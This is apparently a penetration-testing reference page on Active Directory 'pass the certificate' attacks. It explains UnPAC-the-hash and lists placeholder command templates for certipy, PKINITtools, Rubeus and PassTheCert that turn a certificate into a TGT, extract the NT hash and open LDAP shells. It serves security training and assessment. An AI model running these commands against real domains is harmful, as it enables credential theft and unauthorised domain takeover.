# Pass the Certificate

A certificate obtained from ADCS or shadow credentials authenticates via PKINIT to get a TGT. The UnPAC-the-hash technique then extracts the account's NT hash from the PAC of that ticket — converting a certificate into a reusable hash.

## Why It Works

PKINIT authentication returns a ticket whose PAC contains the account's NTLM credential so that NTLM-only services still work. That design detail lets a certificate holder recover the hash without ever knowing the password.

## Prerequisites

* A certificate for the target account (from ADCS or shadow credentials)
* Kerberos reachable on a DC

## Execution

**Certificate (pfx)**

* unpac the hash
  * `certipy auth -pfx <crt_file> -dc-ip <dc_ip>` [\[tool\]](https://github.com/ly4k/Certipy)
  * `gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> "<domain>/<dc_name>" <tgt.ccache>` [\[tool\]](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
    * `getnthash.py -key '<AS-REP encryption key>' '<domain>'/'<dc_name>'` [\[tool\]](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)
* Pass the certificate
  * pkinit
    * `gettgtpkinit.py -cert-pfx "<pfx_file>" ^[-pfx-pass "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"` [\[tool\]](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
    * `Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show` [\[tool\]](https://github.com/GhostPack/Rubeus)
    * `certipy auth -pfx <crt_file> -dc-ip <dc_ip>` [\[tool\]](https://github.com/ly4k/Certipy)
  * schannel
    * `certipy auth -pfx <pfx_file> -ldap-shell` [\[tool\]](https://github.com/ly4k/Certipy)
      * add\_computer
        * Set RBCD
          * **→ RBCD**
    * `certipy cert -pfx "<pfx_file>" -nokey -out "user.crt"` [\[tool\]](https://github.com/ly4k/Certipy)
      * `certipy cert -pfx "<pfx_file>" -nocert -out "user.key"` [\[tool\]](https://github.com/ly4k/Certipy)
        * `passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>` [\[tool\]](https://github.com/AlmondOffSec/PassTheCert)

## Related

* [Misconfigured Templates (ESC1–ESC4)](file:///9685693/adcs/misconfigured-templates-esc1-esc4.md) — obtaining the certificate
* [Pass-the-Hash & OverPass-the-Hash](file:///9685693/lateral-movement/pass-the-hash.md) — using the recovered hash
